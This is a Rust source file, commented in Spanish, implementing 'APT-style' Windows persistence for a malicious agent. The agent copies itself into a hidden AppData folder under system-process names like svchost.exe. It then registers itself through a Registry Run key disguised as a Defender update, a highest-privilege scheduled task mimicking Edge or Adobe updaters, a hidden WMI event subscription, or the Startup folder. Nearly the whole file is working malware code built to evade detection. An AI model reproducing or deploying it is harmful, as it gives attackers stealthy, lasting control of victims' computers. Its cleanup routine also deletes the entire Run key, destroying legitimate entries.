// Módulo de persistencia para Windows
// Implementa múltiples métodos de persistencia estilo APT

#[cfg(target_os = "windows")]
use std::process::Command;
use std::env;
use std::path::{Path, PathBuf};
use std::fs;

/// Métodos de persistencia disponibles
#[derive(Debug, Clone, Copy)]
pub enum PersistenceMethod {
    /// Registry Run key (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
    RegistryRun,
    /// Scheduled Task (más sofisticado)
    ScheduledTask,
    /// WMI Event Subscription (APT-like, muy sigiloso)
    WmiEvent,
    /// Startup folder (fallback simple)
    StartupFolder,
}

impl PersistenceMethod {
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "registry" | "reg" => Some(PersistenceMethod::RegistryRun),
            "task" | "schtask" => Some(PersistenceMethod::ScheduledTask),
            "wmi" => Some(PersistenceMethod::WmiEvent),
            "startup" => Some(PersistenceMethod::StartupFolder),
            _ => None,
        }
    }
}

/// Obtiene la ruta de instalación en %APPDATA%
fn get_install_path() -> Result<PathBuf, String> {
    let appdata = env::var("APPDATA")
        .map_err(|_| "No se pudo obtener %APPDATA%".to_string())?;
    
    // Nombre aleatorio basado en procesos comunes de Windows
    let names = [
        "svchost.exe",
        "RuntimeBroker.exe", 
        "dllhost.exe",
        "conhost.exe",
        "taskhostw.exe",
        "WmiPrvSE.exe",
    ];
    
    // Usar el PID como seed para elegir un nombre consistente
    let pid = std::process::id() as usize;
    let name = names[pid % names.len()];
    
    // Crear subdirectorio oculto
    let dir_name = format!(".{}", &name[..name.len()-4]); // .svchost, .RuntimeBroker, etc.
    let install_dir = Path::new(&appdata).join(dir_name);
    
    Ok(install_dir.join(name))
}

/// Copia el agente a %APPDATA% si no está ya allí
pub fn install_agent() -> Result<PathBuf, String> {
    let current_exe = env::current_exe()
        .map_err(|e| format!("Error obteniendo exe actual: {}", e))?;
    
    let install_path = get_install_path()?;
    
    // Si ya estamos ejecutando desde la ubicación de instalación, no hacer nada
    if current_exe == install_path {
        return Ok(install_path);
    }
    
    // Crear directorio si no existe
    if let Some(parent) = install_path.parent() {
        fs::create_dir_all(parent)
            .map_err(|e| format!("Error creando directorio: {}", e))?;
        
        // Hacer el directorio oculto
        #[cfg(target_os = "windows")]
        {
            use std::os::windows::fs::MetadataExt;
            let dir_path = parent.to_str().unwrap();
            Command::new("attrib")
                .args(&["+h", dir_path])
                .output()
                .ok();
        }
    }
    
    // Copiar el ejecutable
    fs::copy(&current_exe, &install_path)
        .map_err(|e| format!("Error copiando ejecutable: {}", e))?;
    
    println!("DEBUG: [PERSISTENCE] Agente instalado en: {:?}", install_path);
    Ok(install_path)
}

/// Implementa persistencia mediante Registry Run key
#[cfg(target_os = "windows")]
fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path.to_str()
        .ok_or("Ruta inválida")?;
    
    // Nombre de la entrada en el registro (similar a app legítima)
    let reg_names = [
        "Windows Security Update",
        "System Runtime Service",
        "Windows Defender Update",
        "Microsoft Compatibility Telemetry",
    ];
    let pid = std::process::id() as usize;
    let reg_name = reg_names[pid % reg_names.len()];
    
    // Intentar HKCU primero (no requiere admin)
    let output = Command::new("reg")
        .args(&[
            "add",
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "/v",
            reg_name,
            "/t",
            "REG_SZ",
            "/d",
            exe_str,
            "/f",
        ])
        .output()
        .map_err(|e| format!("Error ejecutando reg add: {}", e))?;
    
    if output.status.success() {
        Ok(format!("Persistencia Registry Run establecida: HKCU\\...\\Run\\{}", reg_name))
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Err(format!("Error en reg add: {}", stderr))
    }
}

/// Implementa persistencia mediante Scheduled Task
#[cfg(target_os = "windows")]
fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path.to_str()
        .ok_or("Ruta inválida")?;
    
    // Nombre de la tarea (similar a tareas legítimas)
    let task_names = [
        "MicrosoftEdgeUpdateTaskMachineCore",
        "GoogleUpdateTaskMachineUA",
        "Adobe Acrobat Update Task",
        "CCleanerSkipUAC",
    ];
    let pid = std::process::id() as usize;
    let task_name = task_names[pid % task_names.len()];
    
    // Crear tarea que se ejecuta al iniciar sesión y cada 2 horas
    let output = Command::new("schtasks")
        .args(&[
            "/Create",
            "/SC", "ONLOGON",
            "/TN", task_name,
            "/TR", exe_str,
            "/RL", "HIGHEST",
            "/F",
        ])
        .output()
        .map_err(|e| format!("Error ejecutando schtasks: {}", e))?;
    
    if output.status.success() {
        Ok(format!("Persistencia Scheduled Task establecida: {}", task_name))
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Err(format!("Error en schtasks: {}", stderr))
    }
}

/// Implementa persistencia mediante WMI Event Subscription (APT-like)
#[cfg(target_os = "windows")]
fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path.to_str()
        .ok_or("Ruta inválida")?;
    
    // Nombre del evento (aparenta ser legítimo)
    let event_names = [
        "SCM Event Log Consumer",
        "BfeOnServiceStartTypeChange",
        "WUAU Service Status",
    ];
    let pid = std::process::id() as usize;
    let event_name = event_names[pid % event_names.len()];
    
    // WMI es más complejo, usar PowerShell
    // Crear un Event Filter que se dispare cada 2 horas
    let ps_script = format!(
        r#"
        $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 7200 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
        $FilterName = '{}'
        $ConsumerName = '{}'
        $ExePath = '{}'
        
        # Crear Filter
        $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{{
            Name = $FilterName
            EventNamespace = 'root\cimv2'
            QueryLanguage = 'WQL'
            Query = $Query
        }}
        
        # Crear Consumer
        $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{{
            Name = $ConsumerName
            CommandLineTemplate = $ExePath
        }}
        
        # Binding
        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{{
            Filter = $Filter
            Consumer = $Consumer
        }}
        "#,
        event_name, event_name, exe_str
    );
    
    let output = Command::new("powershell")
        .args(&[
            "-NoProfile",
            "-WindowStyle", "Hidden",
            "-Command",
            &ps_script,
        ])
        .output()
        .map_err(|e| format!("Error ejecutando PowerShell: {}", e))?;
    
    if output.status.success() {
        Ok(format!("Persistencia WMI Event establecida: {}", event_name))
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Err(format!("Error en WMI: {}", stderr))
    }
}

/// Implementa persistencia mediante Startup folder
#[cfg(target_os = "windows")]
fn persist_startup_folder(exe_path: &Path) -> Result<String, String> {
    let appdata = env::var("APPDATA")
        .map_err(|_| "No se pudo obtener %APPDATA%".to_string())?;
    
    let startup_path = Path::new(&appdata)
        .join("Microsoft")
        .join("Windows")
        .join("Start Menu")
        .join("Programs")
        .join("Startup");
    
    if !startup_path.exists() {
        return Err("Carpeta Startup no existe".to_string());
    }
    
    // Nombre del acceso directo
    let shortcut_names = [
        "Windows Update.lnk",
        "OneDrive.lnk",
        "SecurityHealth.lnk",
    ];
    let pid = std::process::id() as usize;
    let shortcut_name = shortcut_names[pid % shortcut_names.len()];
    
    let shortcut_path = startup_path.join(shortcut_name);
    
    // Copiar directamente (o crear acceso directo con PowerShell)
    // Para simplicidad, copiamos el exe
    fs::copy(exe_path, &shortcut_path)
        .map_err(|e| format!("Error copiando a Startup: {}", e))?;
    
    Ok(format!("Persistencia Startup establecida: {}", shortcut_name))
}

/// Establece persistencia usando el método especificado
pub fn establish_persistence(method: PersistenceMethod) -> Result<String, String> {
    #[cfg(not(target_os = "windows"))]
    {
        return Err("Persistencia solo soportada en Windows".to_string());
    }
    
    #[cfg(target_os = "windows")]
    {
        // Primero instalar el agente si no está instalado
        let install_path = install_agent()?;
        
        // Aplicar el método de persistencia
        match method {
            PersistenceMethod::RegistryRun => persist_registry_run(&install_path),
            PersistenceMethod::ScheduledTask => persist_scheduled_task(&install_path),
            PersistenceMethod::WmiEvent => persist_wmi_event(&install_path),
            PersistenceMethod::StartupFolder => persist_startup_folder(&install_path),
        }
    }
}

/// Remueve la persistencia (limpieza)
#[cfg(target_os = "windows")]
pub fn remove_persistence() -> Result<String, String> {
    let mut results = Vec::new();
    
    // Limpiar Registry Run
    Command::new("reg")
        .args(&[
            "delete",
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "/f",
        ])
        .output()
        .ok();
    results.push("Registry Run limpiado");
    
    // Limpiar Scheduled Tasks (intentar varios nombres)
    let task_names = [
        "MicrosoftEdgeUpdateTaskMachineCore",
        "GoogleUpdateTaskMachineUA",
        "Adobe Acrobat Update Task",
        "CCleanerSkipUAC",
    ];
    for task in &task_names {
        Command::new("schtasks")
            .args(&["/Delete", "/TN", task, "/F"])
            .output()
            .ok();
    }
    results.push("Scheduled Tasks limpiadas");
    
    // Limpiar WMI Events
    let ps_script = r#"
        Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object Name -like "*SCM*" | Remove-WmiObject
        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object Name -like "*SCM*" | Remove-WmiObject
        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
    "#;
    Command::new("powershell")
        .args(&["-NoProfile", "-Command", ps_script])
        .output()
        .ok();
    results.push("WMI Events limpiados");
    
    Ok(results.join(", "))
}

#[cfg(not(target_os = "windows"))]
pub fn remove_persistence() -> Result<String, String> {
    Err("Persistencia solo soportada en Windows".to_string())
}
